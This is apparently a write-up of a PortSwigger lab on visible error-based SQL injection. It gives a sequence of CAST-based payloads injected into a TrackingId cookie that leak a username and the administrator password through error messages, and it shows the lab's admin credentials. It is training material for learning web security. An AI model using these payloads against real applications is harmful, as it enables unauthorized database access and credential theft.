## Lab Description -

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/8b2f0b76df9d8ef33c516b2b9eeef0d3deed7a85/SQL-Injection/Lab%3A%20Visible%20error-based%20SQL%20injection/Images/Lab%20Description.png)


## Overview -

Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an id parameter: 

```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

We can induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a "visible" one.

One way of achieving this is to use the CAST() function, which enables you to convert one data type to another. For example, consider a query containing the following statement:

**Resquest payload**

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an int, may cause an error similar to the following: 

**Response**

```sql
ERROR: invalid input syntax for type integer: "Example data"
```

> NOTE - This type of query may also be useful in cases where you're unable to trigger conditional responses because of a character limit imposed on the 
> query. 


## Solution - 

When clicking on any catgory in products filter, browser sends a GET request with a **tracking cookie** & a session cookie.

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/4927c0e4f210ccc98fd0117b494b00e06f0f51df/SQL-Injection/Lab%3A%20Visible%20error-based%20SQL%20injection/Images/Cookie%20Session%20Details.png)

Let's try to input a special character `'` in the TrackingID parameter since it is vulnerable as per lab description to try and induce an SQL error.

```sql
Cookie: TrackingId=1IV6QKZWpbBxZLdG';
```

**Response**

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/5110b692271f567af70b3207b0d1899f6d537dd1/SQL-Injection/Lab%3A%20Visible%20error-based%20SQL%20injection/Images/Apostrophe%20Vulnerability%20in%20Response.png)

Now we induced an error in the application and so we got an error response back which leaked the query  being made in the backend.

```sql
SELECT * FROM tracking WHERE id = '1IV6QKZWpbBxZLdG''
```

Since we know what query is being made, now we can craft our payload using CAST conditional expresiions.

First we give a generic SELECT query & CAST the returned value to **int** datatype.

```sql
TrackingId=1IV6QKZWpbBxZLdG' AND CAST((SELECT 1) AS int)--
```
The subquery (SELECT 1) is selecting the value 1 from the database. The CAST function is then used to convert that value into an integer data type (AS int).

**Response**

We get a `500 Internal Server error` with the following error response.

![image]()

It says that **AND condition must be a boolean expression.**

So we modify the injection payload with a comparison operator so that it returns boolean data.

```sql
TrackingId=1IV6QKZWpbBxZLdG' AND 1=CAST((SELECT 1) AS int)--
```

Now we get a different response ie. **The condition got TRUE and it returned all the category items** with a `200 OK` status code.


Now modify the *SELECT* query to retreive username from the database.

```sql
' AND 1=CAST((SELECT username FROM users) AS int)--
```

**Response**

We get a `500 Internal Server error` with the follwoing error response back.

![image]()

```sql
SELECT * FROM tracking WHERE id = '1IV6QKZWpbBxZLdG' AND 1=CAST((SELECT username FROM users) AS'. Expected char
````

THe query is being truncated here. So lets either remove some or all of `trackingID` cookie value to free up some space.

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--;
```
**Response**


![image]()

Modify the query to return only 1 row,

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
It tries to retrieve the **username** column from the **users** table using the subquery **(SELECT username FROM users LIMIT 1)**. The **LIMIT 1** clause ensures that only one row(*first row*) is returned. 

The obtained username is then cast as an integer using the CAST function.(WHY ? - To retrieve the obtained info via the error responses)
EG - It may produce error like `User shebu is not an integer`

**Response** 

![image]()

Now that we know that `administrator` is the first user in the users table , let's retreive his password.

```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

Here in this payload we didn't giove  `WHERE username="administrator"` because LIMIT 1 ensures that it retreives the info of first column which in this case is the administrator.

Thus we got the password of the admin user via error response.

![image]()

Admin Credentials - `administrator:92xxhtubhmgxhsyhhldk`

Now login as admin in the shopping website to solve the lab.

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/8b2f0b76df9d8ef33c516b2b9eeef0d3deed7a85/SQL-Injection/Lab%3A%20Visible%20error-based%20SQL%20injection/Images/Lab%20Solution.png)





